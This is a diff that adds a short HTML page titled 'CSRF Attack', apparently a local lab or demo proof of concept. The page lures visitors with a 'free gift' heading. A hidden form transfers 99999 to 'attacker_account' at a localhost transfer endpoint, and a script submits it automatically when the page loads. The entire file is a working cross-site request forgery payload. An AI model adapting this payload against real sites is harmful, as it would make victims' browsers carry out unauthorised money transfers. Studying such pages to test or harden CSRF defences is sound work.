@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>Click here to get a free gift!</h1>
+
+    <!-- CSRF 공격을 위한 자동 폼 전송 -->
+    <form action="http://localhost:8080/transfer" method="post" id="csrfForm">
+        <input type="hidden" name="amount" value="99999" />
+        <input type="hidden" name="recipient" value="attacker_account" />
+    </form>
+
+    <script>
+        // 페이지가 로드되면 자동으로 폼을 전송
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
